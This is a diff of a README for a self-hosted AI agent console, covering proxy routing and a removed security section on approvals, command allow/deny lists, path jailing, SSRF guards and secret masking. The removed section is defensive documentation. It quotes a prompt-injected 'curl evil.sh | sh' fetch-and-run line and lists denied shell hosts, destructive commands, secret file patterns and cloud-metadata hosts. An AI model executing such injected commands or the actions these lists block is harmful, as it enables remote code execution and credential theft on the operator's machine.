 ![The Proxy tab: ELITE and ANONYMOUS rows, ping, uptime, favourite, USE and clear](screenshots/proxy.png)
 
-Agents leak. 🕵️ By default every model call, every `web_search`, every `fetch_url` and every `curl` an agent runs in the shell leaves from **your** IP. The **Proxy** tab — in the top nav, beside Providers — puts a checkpoint in front of all of it.
+Agents leak. 🕵️ By default every model call, every `web_search`, every `fetch_url` and every `curl` an agent runs in the shell leaves from **your** IP. The **Proxy** tab — in the top nav, beside Providers — puts a checkpoint in front of all of it — except endpoints on **your own network**, which a proxy cannot reach anyway.
 
 <details>
 <summary>List grades, ping, favourites and global routing</summary>
@@ -671,8 +1130,10 @@ Agents leak. 🕵️ By default every model call, every `web_search`, every `fet
 - 🥇 **Two grades of hiding, and nothing below them.** **ELITE** *(best)* never announces itself and never forwards your address, so the far end sees a stranger. **ANONYMOUS** *(better)* strips your address, but the request may still be identifiable as proxied. Transparent proxies are refused at the source: they are your real IP with extra steps.
 - 📡 **Ping and uptime, per row.** **PING** measures a real round-trip through that proxy to `https://httpbin.org/ip`; **PING ALL** sweeps the whole list in one server request with `curl_multi`, so 300 rows take seconds instead of the better part of an hour. **Uptime** comes from the feed's own history — how much of the recent past that endpoint answered — and *Working only* hides the rows that stopped answering.
 - ⭐ **Favourites stick.** Star a row and it is kept with your settings rather than in the feed, so a proxy that worked yesterday is one click away after the list rotates.
-- ✅ **USE routes everything, server-side.** The choice is saved in `config.json`, because the **server** is what makes the call — a browser-only setting is invisible to it, which is exactly why picking a proxy once changed nothing. From then on: model relays, `web_search`, `fetch_url` and every shell command that honours proxy variables (`curl`, `wget`, `nmap`) go through it, while `localhost` and `127.0.0.1` stay direct via `NO_PROXY`. A per-request proxy in an agent's own spec still wins over the global choice.
-- ⚠️ **It does not fail closed — deliberately.** Free lists rot; when the selected proxy dies, calls fail with a curl error and its row says so. That is a consequence you can *see*, not a silent fall back to your real address. **CLEAR SELECTION** returns everything to the direct route.
+- ✅ **USE routes everything outside your network, server-side.** The choice is saved in `config.json`, because the **server** is what makes the call — a browser-only setting is invisible to it, which is exactly why picking a proxy once changed nothing. From then on: model relays, `web_search`, `fetch_url` and every shell command that honours proxy variables (`curl`, `wget`, `nmap`) go through it.
+- 🔌 **What it never carries: an endpoint on your own network.** `ModelManager::activeProxy()` decides per call, and a loopback, private (`10.x`, `172.16–31.x`, `192.168.x`), CGNAT, link-local, `.local`/`.lan`/`.internal` or bare-hostname endpoint is called **directly** — even when a proxy is selected, and even when one was asked for with that request. A proxy leaves your network; a runner on the LAN is not out there. The **Proxy tab says which hosts it is skipping** while a proxy is selected, so "active proxy" never reads as "everything is proxied" while the model you are watching goes direct.
+- 🧹 **Selecting and clearing both write both sides.** The choice lives in the browser *and* in `sandbox.proxy_active`, because the server makes the call. **CLEAR SELECTION** — or removing the active entry — clears `config.json` too and says so only when the server confirms; before v408 it wrote the browser alone, toasted "direct connection", and traffic kept going through the proxy.
+- ⚠️ **It does not fail closed — deliberately.** Free lists rot; when the selected proxy dies, calls fail with a curl error, which reads as *the server* being down rather than the proxy. That is a consequence you can *see*, not a silent fall back to your real address.
 
 </details>
 
@@ -794,441 +1255,6 @@ The app checks its own published release, shows you **exactly what would change*
 
 ![Config → Updates: the archive hash, the file-by-file diff, and the What's new row](screenshots/updates-panel.png)
 
-> ⚠️ **Install is deliberately not implemented yet.** Choosing what to overwrite — and merging new config keys into a config that already exists — is a separate decision from *knowing* what changed, and this step only does the knowing.
-
----
-
-## 🔐 Security & guardrails — safe by construction 🛡️
-
-> **The short version:** giving a language model a shell, a filesystem and the web
-> is normally a terrifying idea. So this app assumes the model is *hostile*, the
-> web content it reads is *booby-trapped*, and the only trustworthy actor is
-> **you, the operator**. Every capability is **off until you switch it on**, every
-> dangerous action **asks first**, and every escape hatch has a floor beneath it.
-> Nothing ships with a key 🔑, nothing runs before a token 🔑, and no tool can
-> reach past the fence you drew. 🧱
-
-### 🔑 1. The front door is locked — a per-device access token
-- **🚪 Every single API route is gated.** No token → `401`. The only thing standing between a stranger and your agents' conversations, your files and your shell; the app has **no user accounts**, on purpose.
-- **🧬 Nothing ships with a token.** A fresh copy **refuses to serve anything** until you run `./setup-token.sh` (or the one-click installer does it for you) — a fresh install answers `503 {"error":"no token configured"}`. You literally cannot forget to set one.
-- **📵 The token never roams.** It is a **device-local credential**, *stripped from every state bundle* before it is mirrored to the server or synced to another device. One browser's empty field can never wipe another device's working paste.
-- **🔁 Rotate on demand** — `./setup-token.sh --force` mints a new one; the old value dies instantly.
-- **🧷 A restore cannot hand the gate away.** RESTORE keeps **this copy's own** access token, gate and roots even when the file came from an installation with a different token — so restoring someone else's backup can neither lock you out of your copy nor open it with theirs.
-- **🔎 Lost it? `./setup-token.sh --show` prints the one in use** and says whether the gate is on or off. It
-  needs python **or** php — whichever answers, php being the one a running copy cannot be without — and on
-  Windows `start.bat -Token` prints the same token with no interpreter at all.
-
-### 🚦 2. Approvals — nothing scary happens without a nod
-- **✋ Ask-first by default.** `write_file`, `exec`, `run_code`, `git_commit` and their friends **queue a prompt** you answer: **Allow once / Always / Deny**.
-- **🟢 Auto-approve is opt-in** — an explicit switch you flip, never an inherited default. Turn it on and any agent may write files without asking; leave it off and a human stays in the loop.
-- **🛑 Auto-deny — the panic button.** One switch refuses *everything* that would otherwise ask, instantly, everywhere.
-- **📥 A single Pending-approvals queue** collects everything waiting (from every agent **and** every remote MCP friend) so nothing slips through unseen.
-
-### 🧾 3. Allow / Deny lists — an argv-level bouncer
-
-![The Allow / Deny panel: per-interpreter levels, the editable denylist, and Restore built-in defaults](screenshots/deny-interpreters-fixed.png)
-- **✅ An allowlist you own** decides which programs may run at all. Each command is matched **argument by argument** — no glob fuzz.
-- **⛔ A denylist that wins over approvals.** It is checked *before* the allowlist and before the approval prompt, so a name on it can never be waved through with "Always allow". `reboot`, `shutdown`, `rm`, `sudo`, `cmd`, `powershell` and the classic foot-guns live here.
-- **🔁 …but nothing is denied *forever*.** The list is a **default**, not a law: an explicit `sandbox.exec_deny` in `storage/config.json` **replaces it wholesale**, and the same list is editable inline under **Config → Shell access** (or an MCP card's *Permissions* tab). Remove a name and it becomes an ordinary command again — refused as *"not allowed"* and back in the approval queue, exactly like everything else. No program is refused by name anywhere in code.
-- **↩️ The undo path is on screen, not in the docs.** A refusal names the exact place to fix it — *"delete the `explorer` line under **Config → Permissions → Shell access → Allow / Deny** (section 4), add it to section 2"* — and says why an approval can't do it (the denylist is checked first). In that panel, **Restore built-in defaults** reloads the shipped list even after a custom one replaced it, so you can always see what you replaced. An empty box falls back to the built-in defaults on purpose: clearing it must not silently un-deny `rm` and `sudo`. For a genuinely empty denylist, set `"exec_deny": []` in `storage/config.json` — which is what the panel's hint tells you.
-- **🧨 Tripwires for metacharacters** — `|`, `&&`, `eval`, `xargs`, `env` and friends are refused, so a model can't smuggle a second command through a "harmless" one.
-- **🎚️ Per-interpreter levels** — Blocked / Scripts only / Full — so `run_code` can be dialled from "no" to "quiet scripts" to "go wild" independently of `exec`.
-- **🚀 Background commands pass the same bouncer.** `exec_start` goes through the allowlist, the denylist and the approval prompt exactly as `exec` does — a server or watcher is not a way around the gate — and `exec_kill` stops the handle it was given. Inline-code flags stay refused for known interpreters even when merely allowlisted, and the path guard covers unlisted commands too.
-
-### 🧱 4. The jail — a fence with no back gate
-- **🔒 Every path is resolved server-side.** `../`, `..\\`, absolute paths and **symlinks** are all resolved and then checked — anything outside your declared **read/write roots** is refused with a message the model can read, not a mysterious crash.
-- **🙈 Protected paths — secrets are invisible even *inside* a root.** A default deny-list (`storage/`, `.git`, `.env*`, `*.pem`, `*.key`, dotfiles, …) is enforced in the resolver itself, so **even if you point the root at the whole app folder, the access token and every provider key still cannot be read.** Clear the list to opt out — nothing is permanent.
-- **✂️ Write scope is separate from read scope.** Keep writes in a scratch folder and even a prompt-injected agent can't overwrite `Config.php`, `.htaccess` or session data.
-
-### 🐚 5. No shell to hijack
-- **🧩 `exec` takes an *argv array*, not a string.** There is **no `sh -c`, no pipes, no redirects, no `$(...)`** — so there is no second command to inject, ever. The dangerous parts of "running a command" simply don't exist here.
-- **🪟/🐧 Windows-aware** — builtins are implemented in PHP where no `.exe` exists, `.cmd`/`.bat` shims are never shelled, and the prompt is told the truth about the host so it stops guessing.
-- **🔤 One entry covers both spellings.** Policy comparisons fold case and ignore a trailing `.exe`/`.com`, so `exec_allow: [grep]` matches the `grep.exe` Git for Windows actually ships, and a deny entry for `bash` also stops `bash.exe` (the WSL launcher). Without this the lists only protected the spelling you happened to type.
-- **🪟 The Windows command hosts are denied by default.** `cmd`, `powershell`, `pwsh`, `wscript`, `cscript`, `mshta`, `rundll32`, `regsvr32`, `msiexec`, `wmic`, `schtasks`, `sc`, `reg`, `regedit` and `explorer` are each the local spelling of `sh -c` — the payload rides inside an argument, so the allowlist, the path guard and the jail never see it. They are **defaults you can remove**, not permanent refusals: that is the difference between a policy and a hardcoded block.
-
-### 🧬 6. Edits are atomic, or they don't happen
-- **🧷 `apply_patch` (V4A) and `multi_edit` are all-or-nothing.** Every hunk must match its context **exactly once**; one miss and **nothing is written** — no half-applied file, no corrupted source.
-- **👀 Read-before-write** is the taught workflow, and search/replace refuses an ambiguous match rather than guessing which one you meant.
-
-### 🐙 7. Git runs on a leash
-- **📜 A subcommand allowlist** — read-only commands (`status`, `diff`, `log`, `show`, `blame`) run freely; anything that **writes** (`add`, `commit`, `checkout`, …) **asks first**.
-- **🚫 Retargeting flags refused** — `-c`, `--git-dir`, `--work-tree`, `--output` can't be used to point git at somewhere it shouldn't go. `git_commit` supplies a safe default identity so it works on a clean host.
-
-### 🌐 8. Network egress is fenced (SSRF guardrails)
-- **🛰️ `fetch_url` and `http_request` refuse private and cloud-metadata hosts** by name — `169.254.x.x`, `metadata.google.internal`, `100.100.100.200` and friends — so a model can't use your box to probe the internal network or steal cloud credentials.
-- **🔒 `http/https` only.** Spoofed `Host`, `Content-Length` and `Accept-Encoding` headers are **stripped**; responses are **truncated** so a giant page can't exhaust memory.
-- **🧪 The API Lab keeps the same rules** and names the layer it failed at (dns / tls / connect / timeout / blocked) instead of leaking a stack trace.
-- **🔒 The certificate is checked, not assumed.** Every outbound model and speech call used to carry `CURLOPT_SSL_VERIFYPEER => false`, so any host that answered was trusted with the API key and the prompt — a café network, a shared VPS neighbour or a proxy from a free list could stand in for the provider. Verification is on now: **Auto** (default) verifies real providers and exempts loopback, private ranges, `.local`/`.lan`/`.internal` names and single-word host names so a self-signed local runner still works; **Always verify** covers those too; **Never verify** is an explicit choice saved in `storage/config.json` under `tls.verify`, and the panel spells out what it means. Plain `http://` endpoints are untouched — there is no certificate in that exchange to check.
-- **📌 A pin is a fingerprint, not a checkbox.** Trusting a LAN host means reading the chain it presents, seeing the SHA-256, and confirming it: `storage/tls/trusted.pem`, listed in Config → TLS / Certificates with its expiry, removable with FORGET (the last removal deletes the file, because an empty CAINFO fails every call while a missing one simply means nothing is pinned). `tls.ca_bundle` can still point at a PEM you manage yourself; an explicit bundle wins over pins and the panel says when it does. Nothing is ever written outside `storage/tls/`, and a certificate close to expiry is named in the TLS panel and in the bell before it becomes an outage.
-
-### 🕵️ 9. Secrets never appear on screen
-- **🙈 Key-shaped headers (`Authorization`, `x-api-key`, `Cookie`, …) are masked in the UI** — display only. Copy and send still use the real value, and the server **never echoes request headers back**.
-- **📚 The converter lesson, learned the hard way.** Saved browser pages faithfully preserve secrets. The app now keeps such dumps **out of the webroot**, and the guidance is plain: **strip keys before saving a page.**
-
-### 🖼️ 10. Vision is safe by construction
-- **🧨 An image that is *also* a script** is the classic polyglot attack. Only **PNG / JPEG / WebP / GIF** are accepted, and only after they sniff as **inert**.
-- **☁️ The bytes never touch the server.** An attached image becomes an in-memory `data:` URL and rides in the request's `image_url` field — **no upload endpoint, no file on disk.** 🗑️
-
-### 🌐 11. The built-in browser is gated on every hop
-- **🚪 Off by default**; every browser route returns **403** until you enable it (and the API refuses the tools regardless of what a prompt says).
-- **🔗 `http/https` only**, cloud-metadata refused, and a **server-side block list** (`*.gov`, `*word*`, bare hosts/IPs, URL paths) is enforced on **every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
-- **🐕 One instance, reaped.** Launching reaps any stray headless Chrome/Edge still holding the profile dir, so there is never a pile of them chewing CPU/GPU.
-
-### 🤝 12. MCP server — lending tools without giving away the house
-- **🎫 Per-friend tokens, each with a scope** — **read** / **write** / **exec** — plus an optional **IP allowlist** and **one-click revoke**. Tokens never expire until you kill them.
-- **📏 Scope is a *ceiling*, the Sandbox is the *floor*.** A friend's token only decides *which* tool it may reach; the call still runs through **every** control above — the file jail, allow/deny lists, interpreter levels, code gate and the approval queue.
-- **⏳ An un-allowed command lands in *your* Pending-approvals list** and the friend's call simply returns *"waiting for the operator."*
-- **🏚️ Friends work in a scratch folder** that gets a **deny-all `.htaccess`**, so what they write is never served over the web.
-- **🧾 Every call is audited** to `storage/mcp.log` (now JSON, so the graph can replay it).
-
-### 🧷 13. Prompt-injection posture
-- **Abandon all trust, ye who `fetch` here.** Anything an agent *reads* is treated as hostile input — which is exactly why commands are allowlisted, executed without a shell, and every path is jailed. A web page that says *"run `curl evil.sh | sh`"* hits three walls before it does anything: the allowlist, the no-shell exec, and the deny list.
-- **🛠️ Tool calls win the argument.** The tool instructions state plainly that a tool call is the **one exception** to any "reply with only text / N words" rule, and the loop **re-prompts once** if a model merely *narrates* a tool call instead of sending it.
-- **🚧 Agents can *call* MCP servers — never add one.** Server connections are operator-only.
-
-### 🚫 14. Everything dangerous defaults to OFF 🐢
-| Capability | Default | Guardrail |
-| --- | --- | --- |
-| 🔑 Access token | **required** | `401` without it — nothing runs first-run |
-| 🐚 `exec` (shell) | **off** | allowlist + absolute deny + no shell |
-| 🐍 `run_code` | **off** | per-interpreter level (Blocked / Scripts / Full) |
-| 🌐 Built-in browser | **off** | `403`, http/https only, block list, SSRF guard |
-| 🔁 API pool | **on** | only engages for a provider that *has* pool keys — with none, `pickKey` returns null and the single provider key is used exactly as before |
-| 🖥️ MCP server | **off** | per-friend scoped tokens, audit log |
-| 🟢 Auto-approve | **off** | every write still asks |
-| 🕶️ Run while tab hidden | **off** | a background loop can't bill you silently |
-| 🧮 Resource Manager | **all off** | the graph renders exactly as before |
-
-### 🧯 15. Fails closed, and tells the truth
-- **🧱 Fail closed** — when in doubt, refuse. A refused path reads as *"outside the allowed directories"*, never a blank `500`.
-- **🧹 Error hygiene** — failures come back as `{"error": "..."}` with HTTP `400` and a message **meant for the model**, and `display_errors` stays off so stack traces and filesystem paths never leak to a browser.
-- **🔍 Observability for you** — a live **Run trace** and an MCP audit log mean every model turn and tool call is inspectable after the fact.
-
-### 🗄️ 16. `storage/` is never web-served — in **every** serving mode
-
-- **🔑 What it holds.** The access token, every provider API key, the state
-  bundle, **every session transcript**, and the **exec allow/deny lists** that
-  decide which shell commands an agent may run. It is the most sensitive folder
-  in the app, and the one-folder design puts it *inside* the web root — so the
-  refusal has to be part of the app, not a step you remember. 🧠
-- **🧭 Same policy everywhere.** `storage/` is not special-cased: `storage`, `logs`,
-  `tmp`, `sessions` and `tests` are refused as **path segments**, in **all four**
-  serving modes, and the dev tooling is treated exactly like the secrets.
-
-| What is requested | 🧪 `serve.php` | 🟡 Apache | 🔴 nginx | 🔵 IIS |
-| --- | --- | --- | --- | --- |
-| `storage/config.json`, `state.json`, sessions | **403** | **403** | **404** | **404** |
-| `tests/php/…`, `tests/js/…` | **403** | **403** | **404** | **404** |
-| The bare folders (`/storage`, `/tests/`) — no listing either | **403** | **403** | **404** | **404** |
-| **Any depth**: `<copy>/storage/config.json`, `<copy>/tests/…` | **403** | **403** | **404** | **404** |
-| `…/STORAGE/state.json` (case variant) | **403** | **403** | **404** | **404** |
-| Dotfiles at **any depth** (`.git/…`, `.htaccess`, `.env`, `.htpasswd`) | **403** | **403** | **404** | deny ¹ |
-| Loose `.json` `.log` `.ini` `.bak` `.key` `.pem` outside `storage/` | served ² | served ² | **404** | served ² |
-| `/api`, `/api/sessions`, `/api/config` | **served** | **served** | **served** | **served** |
-| `ui/js/tests.js`, `ui/js/storage.js`, `/testsuite/` | **served** | **served** | **served** | **served** |
-
-<sub>¹ IIS has no `.htaccess` equivalent: its refusal comes from `web.config`, the way nginx's comes from `nginx.example.conf`. Apache's own `.ht*` default is **not** a substitute — it covers `.htaccess` and `.htpasswd` and serves `.git/config` quite happily — which is why the root `.htaccess` carries the same dot rule as the other two modes. ² These only exist if something wrote them there — `storage/` never is.</sub>
-
-- **🪆 Why “any depth” matters.** A second copy of the app — a backup, an
-  archive of an older version, a folder kept for comparison — brings its **own**
-  `storage/` with the same token and keys in it, and its `tests/` may predate
-  `tests/.htaccess`. A root-only check served all of that. The guard is therefore a
-  **segment** rule, not a prefix rule: anything named `storage` anywhere in the path
-  is refused, which is why `https://host/router/old-copy/storage/config.json`
-  answers `403` instead of a token.
-- **🗂️ The checkout sits in the web root, so `.git/` is part of the surface.**
-  This folder is the repository *and* the thing being served, which puts `.git/`
-  behind the same door as everything else: `.git/config` can carry a remote URL
-  with a token in it, and `.git/objects` reconstructs **every file ever
-  committed** — including one removed later for holding a secret. `serve.php` and
-  `nginx.example.conf` always refused dotfiles; Apache did not, and served
-  `.git/config` with the real `[core]` section as a **200**. The root
-  `.htaccess` now refuses any path segment starting with a dot, at any depth,
-  with `/.well-known` as the single exception so ACME renewal still works — and
-  `apacheGuards.test.php` requests `.git/config`, `.git/HEAD`, `.git/objects/pack/`
-  and a nested `.git` so it cannot quietly reopen.
-- **🧠 Why Apache needs `RedirectMatch`, not just a `RewriteRule`.** In
-  per-directory context a child `.htaccess` **replaces** its parent's rewrite rules
-  unless it opts into `RewriteOptions Inherit` — and every copy of this app ships
-  its own root `.htaccess`, so a rewrite in the outer app never sees
-  `<copy>/tests/…`. mod_alias configuration *is* merged down the tree, so the
-  shipped `RedirectMatch 403` holds no matter what a nested folder declares. (Found
-  with an Apache `rewrite:trace3` log: once the request maps into the copy, the
-  parent's rules are skipped entirely.)
-- **🚫 API routes are exempt — deliberately.** They are **endpoints, not files**.
-  The sidebar asks for `/api/sessions` to list sessions; a rule that matched the
-  word refused that call and broke the UI. No API route maps onto a path on disk —
-  the handlers open `storage/` themselves, server-side.
-- **🎯 Segment-anchored, not substring.** `ui/js/tests.js`, `ui/js/storage.js` and
-  `/testsuite/` are still served: only a folder actually named `tests` is refused.
-- **🔠 Case-insensitive on purpose.** Windows and macOS disks resolve
-  `/STORAGE/state.json` to the real file, so a case-sensitive check was not a
-  check at all — `serve.php` lower-cases every segment, Apache uses `NC` / `(?i)`,
-  and nginx uses `~*`.
-- **🧾 No source either.** `serve.php` refuses any `.php` request except the API
-  front controller, so a mistyped path can't print PHP source as text; nginx is
-  told to deny dotfiles and loose data files (`.json`, `.log`, `.ini`, `.bak`,
-  `.key`, `.pem`) even outside `storage/`.
-- **🟡 Apache files that ship and self-repair.** `storage/.htaccess` refuses its
-  whole folder with `Require all denied` (plus an Apache 2.2 `Order/Deny` fallback,
-  so an old host gets a clean `403` rather than a `500`), `tests/.htaccess` does
-  the same for the dev tooling, and `./setup-token.sh` **re-creates the storage one
-  if a deploy lost it**.
-- **🚨 Verify, don't trust.** After deploying, ask for both — in a private window:
-  ```bash
-  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/storage/config.json   # want 403 / 404
-  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/tests/js/run.mjs       # want 403 / 404
-  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/api/sessions           # want 401, never 403
-  ```
-  JSON or source in the first two means the folder is exposed — stop and fix the
-  rule before anything else. 🛑
-- **🏰 The strongest option:** keep `storage/` **outside** the document root. If
-  the one-folder design forces it inside, the deny rules above are mandatory, not
-  optional.
-
-### 🧪 17. The guards are proven, not assumed
-
-A guard nobody requests is a guard you don't have, so each serving mode has a test
-that **makes the real request** and fails loudly when a path comes back:
-
-| Test | What it actually does |
-| --- | --- |
-| 🧪 `guards.test.php` | Boots `serve.php` on a loopback port and requests the live paths — files, bare folders, case variants, dotfiles, the `/api/*` exemption and lookalike names |
-| 🟡 `apacheGuards.test.php` | Boots the local Apache with this folder as `DocumentRoot` and `AllowOverride All`, so the **shipped `.htaccess` files themselves** are what answer — `/tests`, `/storage`, the archived copy, and the dotfile rule over `.git/config`, `.git/HEAD`, `.git/objects/` and a nested `.git` |
-| 🔴 `nginxGuards.test.php` | Lifts the `location` regexes out of `nginx.example.conf` and runs them through PCRE — the engine nginx matches with — so a rule that reopens a hole fails without nginx installed |
-| 🪆 nested-copy checks | `guards.test.php` requests nested paths directly; `apacheGuards.test.php` does the same against the archived copy when one is present — the case a root-anchored rule misses |
-
-Run them with the rest of the suite (*Tests*, below). 🌱
-
-### 🌐 18. Closed by default in the browser, too
-
-- 🚫 **No CORS wildcard — deliberately.** The API used to answer with
-  `Access-Control-Allow-Origin: *`, which let **any** website on the internet
-  `fetch()` this server and read the answers: every conversation, the memory and
-  the whole config. The UI is served from this same origin and never needed it.
-  Cross-origin is now refused unless the origin is explicitly listed in
-  `ROUTER_CORS_ORIGINS` (comma-separated), and `Vary: Origin` keeps caches honest.
-- 🛡️ **Security headers on every Apache response** — `X-Content-Type-Options:
-  nosniff` (a `.js` can’t be talked into being a script of another type),
-  `X-Frame-Options: DENY` (the console can’t be framed inside another site, so no
-  clickjacking a SAVE button) and `X-XSS-Protection: 1; mode=block`. The built-in
-  server adds `nosniff` to everything it serves, SPA fallback included.
-- 🧊 **Cache policy is part of the contract** — HTML is `no-store`; JS and CSS are
-  `no-cache, must-revalidate`, so a browser can never pair a new module with a
-  month-old one (which is how an old `api.js` once ran beside a new `tools.js`).
-  The UI you audited is the UI that loads. ✅
-- 🔑 **The token never rides along** — it is stripped from every state bundle
-  before that bundle is mirrored to the server or synced to another device (§1).
-- 🙈 **What a *read* hands back is masked, and a copy with no token answers this machine only.** Both are
-  measures in their own right, with their own accounts below: **[§20 🔐 masked reads](#-20-secrets--masked-going-out-restored-coming-back)**
-  and **[§21 🏠 local-only](#-21-no-token-set--this-machine-only)**.
-
-> ⚖️ **The honest caveat:** the app is only as safe as the operator's switches. Turn
-> everything on, auto-approve writes, and point the root at `/` — and you have built
-> yourself a very capable foot-gun. The design *makes the safe choice the default*
-> and *makes the unsafe choice deliberate*, but it does not (and cannot) read your
-> mind. Keep the root narrow, keep approvals on, and rotate your keys. 💙
-
-### 🖥️ 19. Opening programs — a name, never a command line
-
-An agent can open a **real desktop program** on the machine this app runs on (**Config → Permissions →
-Shell access → Programs**). It could not do this usefully before: through `exec` a window was force-closed at the command
-timeout while the whole turn waited on it.
-
-- 🏷️ **The operator's list is the whole allowlist.** An agent may only **name** a program from
-  `sandbox.programs`; the path and the arguments come from that config. No string a model writes ever
-  reaches the OS launcher, so its quoting, `&`, `;` and `%` have nowhere to land — the same reason `exec`
-  takes argv instead of a command line.
-- 🪟 **Detached, so the window outlives the reply** — `cmd /c start` on Windows (the mechanism the built-in
-  browser already opens Chrome/Edge with), a backgrounded process on POSIX. There is no timeout here to
-  close what you asked to open.
-- 🧾 **Audited as a start with no end.** A launch writes one `kind=program phase=start` line and no end
-  line, which is what **Config → TRACE → EXEC** reads back as *started, never finished* — the case that
-  format exists for.
-- 🚫 **`.bat`, `.cmd` and `.ps1` are refused** as launch targets, because starting one means handing back the
-  command shell or script host this whole design keeps away from a model. That refusal is by extension and
-  is deliberately not overridable from the list; `exec_interpreters` is the door for script files, where the
-  script is jailed to the allowed directories and inline code is still refused.
-- 🙋 **Approval is the approval you already have** — *Ask / Allow / Deny* for **Opening programs** and
-  **Closing programs**, plus Auto Approve, Auto Deny and the usual prompt.
-- 🎯 **A close finds the *binary*, never the name.** Processes are matched by the file they are running from
-  (`/proc/<pid>/exe` on Linux, one `Get-CimInstance Win32_Process` query on Windows, `ps` elsewhere) and
-  compared as resolved paths. The older `tasklist` image-name filter made any other copy of that file on the
-  machine into *"the same program"*, so a close could end something you never opened — a vendor's
-  `helper.exe`, a second editor. If a host will not give up a process list, `close` **refuses** rather than
-  falling back to the name.
-- 🚪 **Closing is graceful first** (`taskkill /PID` posts WM_CLOSE; POSIX sends TERM), so a program can still
-  ask about unsaved work; `force` ends the process outright. The reply names the pids it ended, and every one
-  that refused with the reason (`access denied`, `already exited`) — `ok` means the program is gone, not that
-  a signal was sent. A console program with no window has nothing to receive a close request, so it needs
-  force.
-- ⌨️ **Typing is a tool too — `window_type`, and it is really typing.** An agent with an open window can send
-  keystrokes into it, live on screen: `window_open` Notepad, `window_type` the words, watch them appear. The
-  program must already be running (typing into nothing throws instead of pretending), the window is brought
-  forward and the keys sent in one motion, and each call carries at most 2000 characters — a long letter goes
-  in several bursts, which is also what it looks like. Special keys arrive literally (`+`, `%` and friends are
-  escaped, newlines become ENTER), the keystrokes are *never* written to the trace (it records that typing
-  happened, not what was typed), and approval is its own switch — **Typing into programs** beside Opening and
-  Closing. Windows only: it is the system's own keystroke injector, and POSIX has no single equivalent, so
-  anywhere else refuses plainly. And the old rule still holds — the operator names the program, the model only
-  supplies the keys.
-- 📦 **A Store copy is still the same program.** On Windows 11 a program like Notepad *runs* from a
-  WindowsApps path nobody configured, while the list holds the alias stub that launched it — so the match
-  crosses that one boundary by file name, and only there, because neither side is a place a second copy
-  could be hiding. `window_type` also waits a few seconds for a just-opened program to show up before
-  concluding nothing is running, and checks the window really came forward before sending — a stolen focus
-  fails loudly instead of typing into the wrong place.
-- 🧾 **The trace is written by this app alone** — every field is stripped of control characters before it
-  reaches `storage/exec.log`, so an argument carrying a newline cannot append a record of a command that
-  never ran. Full account in **[§22](#-22-the-trace-is-written-by-this-app-alone)**.
-- ⚠️ **Where the window appears matters.** A program opens in the session Apache runs in: started as a
-  console process (`start.bat`) it appears on your desktop, but installed as a Windows **service** it lands
-  in session 0 and nothing is ever visible. On POSIX it needs a desktop session — a headless host has nowhere
-  to draw. The card states which of these is true on this host, so nobody guesses.
-- 🔒 **Off by default** (`sandbox.programs_enabled`, empty list): updating an older install gains the tools
-  and no capability at all until you add a program.
-
-### 🔐 20. Secrets — masked going out, restored coming back
-
-Three routes were handing back the very values they exist to protect. 🚨 It is worth being precise about why
-that is worse than it sounds, because it is not "a leak of one secret" — **it is the same secret that guards
-the other doors.**
-
-- 🎯 **What came back, verbatim** — `GET /api/config` returned the **access token**, a **proxy URL with its
-  password in it**, and every **provider API key**; `GET /api/mcp/servers` returned each MCP client's
-  `headers` (the `Authorization: Bearer …`, and any other key header); `GET /api/mcp-server/config` returned
-  every **friend's token**. The access token is what the front gate compares against, and a friend token is
-  what `McpServer::authenticate()` compares against — so one read disclosed the keys to every gated route.
-  🗝️➡️🚪
-- 🙈 **What comes back now: `********`.** A single constant (`Config::SECRET_MASK`) and two functions —
-  `Config::maskSecrets()` on the way out, `Config::restoreSecrets()` on the way in — so the mask is spelled
-  once and cannot drift between routes. Masked: the access token, `sandbox.proxy_active` **when it carries
-  credentials**, every value in an MCP client's `headers`, the MCP server's tokens, and its protected-paths
-  entries that hold secrets. ✂️
-- 🕳️ **Empty stays empty — the difference matters.** *"No token configured"* and *"a token you are not
-  allowed to see"* are two different states, and the UI has to tell them apart: a fresh install must show an
-  empty field (and the *run `setup-token.sh`* hint), not eight asterisks. So masking is applied **only to
-  values that are actually set**. 🫥 A proxy with **no** username and password is not a secret either — it is
-  a setting, and the panel still names the exit node you are routing through. 🌐
-- ♻️ **Why masking cannot simply mean "never send it":** every panel in this app edits by **read → change
-  one key → post the whole config back**. Hand a page a config with a blanked token and the very next toggle
-  writes the blank back to disk — a wiped credential that shows up later as a server answering `401`, with
-  nothing in the logs to say why. So the read masks and the **write restores.** 🔁
-- 🧬 **Restore matches by *identity*, not by position.** An array index is not a name: reordering two MCP
-  servers, or deleting one and adding another, would have put a stranger's header onto the wrong server (a
-  live credential pointed at an endpoint you never configured). Matching is therefore: a **server by its
-  `id`, then by its URL, then by its command line**; a **friend token by its id, then by its label**. Rename a
-  server in the panel and its `Authorization` header still comes back — that is a test, not a hope. 🪪
-- 🚮 **A mask with nothing behind it is dropped, and said so.** Add a brand-new server, leave the header box
-  showing `********`, and there is no stored value to put back — so the header is **not written at all**
-  rather than being saved as the literal asterisks, which would have been a credential that authenticates as
-  nothing and looks like the far end's fault. The count is reported back on the save. 🧾
-- ✍️ **A real value typed over the mask wins.** Paste a new key into that box and it is stored as typed —
-  masking only ever stands in for "unchanged". 🔑
-- 👁️ **A friend's token is visible exactly once** — when it is created, or when **ROTATE** is pressed: the
-  server keeps it, and a later read answers the mask. The **COPY** button refuses to hand over a mask for the
-  same reason the drop above exists: pasting `********` into a client authenticates as a wrong token, and the
-  failure reads as the *server's* problem rather than as a copy that copied nothing. 📋🚫
-- 🧪 **Proven, not assumed** — `tests/php/secrets.test.php` asserts the mask on every field, that empty stays
-  empty, that a credential-free proxy stays readable, a **clean round-trip restores every secret**, a renamed
-  server keeps its header (URL match), an unresolvable mask is **dropped and counted**, and a typed value
-  beats the mask. ✅
-
-### 🏠 21. No token set — this machine only
-
-`./setup-token.sh --off` prints that it is fine on *"a machine nothing else can reach"* — and until v360
-nothing enforced it. On a copy behind a web server bound to all interfaces, that was not a theoretical gap:
-**`POST /api/sandbox/program` is a program launcher an agent can reach**, `POST /api/sandbox/exec` runs
-commands, and `GET /api/config` — the route from §20 — **answered with the very token that guards the routes
-which *were* protected.** 🚪🔓
-
-- 🧭 **Now the documented posture is the enforced posture.** With `require_token` off, a request whose peer
-  address is **not loopback** gets **`403 {"error":"local requests only"}`**, plus the one-liner that fixes it:
-  `./setup-token.sh` (or `start.bat -Token` on Windows), then paste the token into **Config → Access token**
